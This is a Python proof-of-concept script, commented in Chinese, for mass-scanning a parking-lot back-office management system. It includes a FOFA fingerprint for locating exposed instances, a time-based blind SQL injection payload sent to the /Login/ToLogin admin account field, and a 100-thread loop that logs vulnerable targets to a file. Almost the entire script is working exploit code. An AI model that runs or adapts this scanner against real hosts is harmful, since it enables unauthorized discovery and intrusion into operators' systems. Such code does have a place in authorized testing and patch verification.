#停车场后台管理系统 ToLogin SQL注入漏洞
#FOFA语法：icon_hash="938984120"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='停车场后台管理系统 ToLogin SQL注入漏洞')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        pass
def poc(target):
    payload="/Login/ToLogin"
    data="Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(5)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd="
    proxy={
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
    headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        res1 = requests.post(url=target+payload,timeout=5,verify=False,headers=headers,data='')
        res2 = requests.post(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxy,data=data)
        time1 =res1.elapsed.total_seconds()
        time2 =res2.elapsed.total_seconds()
        # print(time1)
        # print(time2)
        if time2 - time1 >= 4.8:
                print(target+"存在sql注入")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
    except Exception as e:
        pass

if __name__=='__main__':
    main()